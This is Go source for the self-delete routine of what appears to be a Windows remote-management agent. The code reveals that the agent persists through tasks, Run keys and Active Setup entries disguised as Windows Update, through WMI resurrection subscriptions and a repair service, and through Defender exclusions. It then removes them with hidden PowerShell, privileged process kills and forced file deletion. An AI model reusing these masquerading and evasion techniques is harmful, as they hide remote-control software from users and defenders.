//go:build windows

package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"rmm/internal/commands"
)

// Token-guarded permanent self-delete (v1.44). kill-agent only quiets the
// process; this removes every persistence layer in dependency order so no
// survivor resurrects mid-teardown, then deletes the binaries and exits.

var deleteTasks = []string{
	"WindowsUpdate",
	"WindowsUpdateWatchdog",
	"WindowsUpdateOrchestrator",
	"WindowsUpdateCheck",
}

var deleteRunValues = []string{
	"WindowsUpdate",
	"WindowsUpdateWatchdog",
	"WindowsUpdateCheck",
}

// isElevated reports whether we can modify HKLM (tasks/services/WMI/vault
// all need it). Self-delete refuses to run half-elevated: an unelevated
// agent stages delete_pending.json for the elevated watcher/WMI instead.
func isElevated() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func deletePendingPath() string {
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join(os.TempDir(), "delete_pending.json")
	}
	return filepath.Join(filepath.Dir(exe), "delete_pending.json")
}

// runSelfDelete executes teardown after a grace period for the goodbye
// output to flush. Elevated: wipe now. Otherwise: stage the pending flag
// and exit — the elevated watcher/WMI/service honors it on its next run.
func runSelfDelete() {
	time.Sleep(1500 * time.Millisecond)
	if !isElevated() {
		_ = os.WriteFile(deletePendingPath(), []byte("pending\n"), 0600)
		log.Printf("[*] self-delete staged for elevated teardown, exiting")
		os.Exit(0)
	}
	executeTeardown()
	os.Exit(0)
}

// claimDeletePending atomically claims a staged teardown so exactly one
// executor runs it. Returns true when this caller owns the teardown.
func claimDeletePending() bool {
	pend := deletePendingPath()
	active := pend + ".active"
	if _, err := os.Stat(pend); err != nil {
		return false
	}
	if err := os.Rename(pend, active); err != nil {
		return false // another executor claimed it
	}
	return true
}

// enableDebugPriv turns on SeDebugPrivilege so SYSTEM/cross-session
// processes can actually be terminated. Administrators hold it
// disabled-by-default; without it OpenProcess fails and every kill
// silently misses (13 ghosts survived exactly this way). Best effort:
// reports whether it took effect.
func enableDebugPriv() bool {
	const seDebug = "SeDebugPrivilege" // absent as windows.SE_DEBUG_NAME in this x/sys
	var hTok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hTok); err != nil {
		return false
	}
	defer hTok.Close()
	luidStr, err := windows.UTF16PtrFromString(seDebug)
	if err != nil {
		return false
	}
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, luidStr, &luid); err != nil {
		return false
	}
	tp := windows.Tokenprivileges{PrivilegeCount: 1}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	if err := windows.AdjustTokenPrivileges(hTok, false, &tp, 0, nil, nil); err != nil {
		return false
	}
	// AdjustTokenPrivileges reports success even when the privilege wasn't
	// granted (ERROR_NOT_ALL_ASSIGNED rides GetLastError instead) — check
	// it, or the kill log claims a power we don't have (the same lie class
	// as the old "teardown complete").
	return windows.GetLastError() == nil
}

// killSiblings terminates all agent/watcher processes except ourselves
// (the watcher image is identical, so it must die or it restores all).
// Returns kills + surviving pids: callers verify instead of assuming.
func killSiblings() (int, []int) {
	dbg := enableDebugPriv()
	pids, err := process.Pids()
	if err != nil {
		return 0, nil
	}
	var targets []int32
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil && isAgentProc(p) {
			targets = append(targets, pid)
			_ = p.Kill()
		}
	}
	time.Sleep(2 * time.Second)
	var live []int
	for _, pid := range targets {
		if ok, _ := process.PidExists(pid); ok {
			if p, err := process.NewProcess(pid); err == nil && isAgentProc(p) {
				live = append(live, int(pid))
			}
		}
	}
	if len(live) > 0 {
		// Second arm, sequential WMI singles: the provider-side handle
		// kills what OpenProcess can't (proven on this box's 14).
		wmij := 0
		for _, pid := range live {
			if wmiTerminatePID(pid) {
				wmij++
			}
			time.Sleep(500 * time.Millisecond)
		}
		time.Sleep(2 * time.Second)
		var still []int
		for _, pid := range live {
			if ok, _ := process.PidExists(int32(pid)); ok {
				if p, err := process.NewProcess(int32(pid)); err == nil && isAgentProc(p) {
					still = append(still, pid)
				}
			}
		}
		log.Printf("[del] wmi fallback: %d down, %d still survive %v", wmij, len(still), still)
		live = still
	}
	log.Printf("[del] kill: %d targeted, %d survive (debugpriv=%v pids=%v)",
		len(targets), len(live), dbg, live)
	return len(targets) - len(live), live
}

// removeWmiSets deletes both resurrection WMI sets (primary + bland).
func removeWmiSets() {
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb := `$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';` +
			`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
			`Write-Host 'WMI-GONE'`
		out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb).CombinedOutput()
		if err != nil || !strings.Contains(string(out), "WMI-GONE") {
			log.Printf("[del] WMI set %s: %v %s", na, err, strings.TrimSpace(string(out)))
		}
	}
}

// taskPresent reports whether a scheduled task name is registered
// (query failing reads as present: fail safe = report, never claim gone).
func taskPresent(name string) bool {
	_, err := hiddenExec("schtasks", "/query", "/tn", name).CombinedOutput()
	return err == nil
}

// runValuePresent reads one Run value (missing key/value = absent).
func runValuePresent(root registry.Key, name string) bool {
	k, err := registry.OpenKey(root, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	_, _, err = k.GetStringValue(name)
	return err == nil
}

// wmiFiltersPresent lists which of our filter names still exist, one
// query for all sets. Query failure returns all names (fail safe).
func wmiFiltersPresent(names []string) []string {
	out, err := hiddenExec("powershell", "-NoProfile", "-Command",
		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | ForEach-Object { $_.Name }`).CombinedOutput()
	if err != nil {
		return names
	}
	have := map[string]bool{}
	for _, ln := range strings.Split(string(out), "\n") {
		if t := strings.TrimSpace(ln); t != "" {
			have[t] = true
		}
	}
	var found []string
	for _, n := range names {
		if have[n] {
			found = append(found, n)
		}
	}
	return found
}

// servicePresent reports whether the repair service still exists.
func servicePresent() bool {
	return hiddenExec("sc", "query", svcName).Run() == nil
}

// agentPidsNow enumerates live agent/watcher pids excluding ourselves.
func agentPidsNow() []int {
	var live []int
	if pids, err := process.Pids(); err == nil {
		for _, pid := range pids {
			if p, err := process.NewProcess(pid); err == nil && isAgentProc(p) {
				live = append(live, int(pid))
			}
		}
	}
	return live
}

// verifyTeardown returns human-readable remnants; empty = fully gone.
// Every category is CHECKED (query failures count as present) — the only
// thing this function ever certifies is an empty list.
func verifyTeardown(dir string) []string {
	var left []string
	if procs := agentPidsNow(); len(procs) > 0 {
		left = append(left, fmt.Sprintf("procs:%v", procs))
	}
	for _, t := range deleteTasks {
		if taskPresent(t) {
			left = append(left, "task:"+t)
		}
	}
	roots := []struct {
		key  registry.Key
		name string
	}{ {registry.LOCAL_MACHINE, "HKLM"}, {registry.CURRENT_USER, "HKCU"} }
	for _, r := range roots {
		for _, v := range deleteRunValues {
			if runValuePresent(r.key, v) {
				left = append(left, "run:"+r.name+"\\...\\Run\\"+v)
			}
		}
	}
	var filters []string
	for _, s := range wmiSets {
		filters = append(filters, s[0], s[1])
	}
	for _, f := range wmiFiltersPresent(filters) {
		left = append(left, "wmi:"+f)
	}
	if servicePresent() {
		left = append(left, "svc:"+svcName)
	}
	if dir != "" {
		if _, err := os.Stat(dir); err == nil {
			left = append(left, "dir:"+dir)
		}
	}
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`,
		registry.QUERY_VALUE); err == nil {
		k.Close()
		left = append(left, "activesetup:WindowsUpdateClient")
	}
	return left
}

// executeTeardown removes every persistence layer in dependency order
// (resurrectors first), then the files, then sibling processes, then us.
// Must run elevated; best-effort per step, never aborts early.
// The ending is VERIFIED: COMPLETE prints only on an empty recount;
// anything left is PARTIAL with specifics + on-disk evidence (log dirs
// are kept on partial so the operator can triage via the Files tab).
func executeTeardown() {
	exe, _ := os.Executable()
	dir := ""
	if exe != "" {
		dir, _ = filepath.Abs(filepath.Dir(exe))
	}
	if dir == "" {
		dir, _ = os.Getwd()
	}
	log.Printf("[del] self-delete executing from %s", dir)
	removeWmiSets()
	_, _ = hiddenExec("sc", "stop", svcName).CombinedOutput()
	time.Sleep(time.Second)
	_, _ = hiddenExec("sc", "delete", svcName).CombinedOutput()
	for _, t := range deleteTasks {
		_, _ = hiddenExec("schtasks", "/delete", "/tn", t, "/f").CombinedOutput()
	}
	for _, root := range []registry.Key{registry.LOCAL_MACHINE, registry.CURRENT_USER} {
		if k, err := registry.OpenKey(root, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			for _, v := range deleteRunValues {
				_ = k.DeleteValue(v)
			}
			k.Close()
		}
	}
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
	_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+strings.ReplaceAll(dir, "'", "''")+`' -ErrorAction SilentlyContinue`).CombinedOutput()
	// Mirror every class ensureDefenderExclusions asserts (path+proc for
	// dir+exe, data-home paths, CFA app + ASR for the exe): uninstall
	// leaves no RMM residue in Defender policy.
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+strings.ReplaceAll(filepath.Join(localApp, "RMM"), "'", "''")+`' -ErrorAction SilentlyContinue`).CombinedOutput()
	}
	_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+strings.ReplaceAll(filepath.Join(os.TempDir(), "RMM"), "'", "''")+`' -ErrorAction SilentlyContinue`).CombinedOutput()
	if exe != "" {
		q := strings.ReplaceAll(exe, "'", "''")
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -AttackSurfaceReductionOnlyExclusions '`+strings.ReplaceAll(dir, "'", "''")+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -AttackSurfaceReductionOnlyExclusions '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ControlledFolderAccessAllowedApplications '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
	}
	// Data dirs (unlocked files). The running exes + locked files fall to
	// the delayed deleter below. Log dirs are wiped only on verified
	// COMPLETE (partial keeps them as triage evidence).
	w := loadWatchCfg()
	killed, surv := killSiblings()
	log.Printf("[del] first kill: %d down, survivors=%v", killed, surv)
	for _, d := range []string{w.backupDir, w.backupDir2, vaultDir(), w.legacyDir, w.legacyDirX86} {
		if d != "" {
			_ = os.RemoveAll(d)
		}
	}
	_ = os.Remove(deletePendingPath())
	_ = os.Remove(deletePendingPath() + ".active")
	if dir != "" {
		_ = os.RemoveAll(dir) // direct attempt while rivals are down (ours stays locked)
	}
	spawnDelayedDeleter(dir, exe)
	time.Sleep(3 * time.Second)
	left := verifyTeardown(dir)
	if len(left) > 0 {
		// One retry: slow exits + a second direct rmdir, then re-verify.
		k2, s2 := killSiblings()
		log.Printf("[del] retry kill: %d down, survivors=%v", k2, s2)
		if dir != "" {
			_ = os.RemoveAll(dir)
		}
		time.Sleep(2 * time.Second)
		left = verifyTeardown(dir)
	}
	verdict := commands.FormatTeardownReport(left)
	if len(left) > 0 {
		// PARTIAL: leave evidence (result file + logs) for Files-tab triage.
		res := verdict + "\nat=" + time.Now().Format(time.RFC3339) + "\n"
		target := filepath.Join(os.TempDir(), "delete_result.txt")
		if dir != "" {
			if _, err := os.Stat(dir); err == nil {
				target = filepath.Join(dir, "delete_result.txt")
			}
		}
		_ = os.WriteFile(target, []byte(res), 0644)
		log.Printf("[del] evidence kept at %s; log dirs kept", target)
	} else {
		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
			_ = os.RemoveAll(filepath.Join(localApp, "RMM"))
		}
		_ = os.RemoveAll(filepath.Join(os.TempDir(), "RMM"))
	}
	log.Printf("%s", verdict)
}

// spawnDelayedDeleter removes the running exes + dirs after we exit
// (Windows cannot delete a running exe). Two passes seconds apart:
// the first usually fails on handles our own exit is still releasing.
// Hidden, detached, best effort — verifyTeardown already ran, so this is
// mop-up, not promise.
func spawnDelayedDeleter(dir, exe string) {
	var args []string
	if exe != "" {
		args = append(args, `del /f /q "`+exe+`"`)
	}
	for _, d := range []string{dir, vaultDir()} {
		if d != "" {
			args = append(args, `rmdir /s /q "`+d+`"`)
		}
	}
	pass := strings.Join(args, ` & `)
	cmd := `ping -n 4 127.0.0.1>nul & ` + pass + ` & ping -n 7 127.0.0.1>nul & ` + pass
	c := hiddenExec("cmd.exe", "/c", cmd)
	_ = c.Start()
}
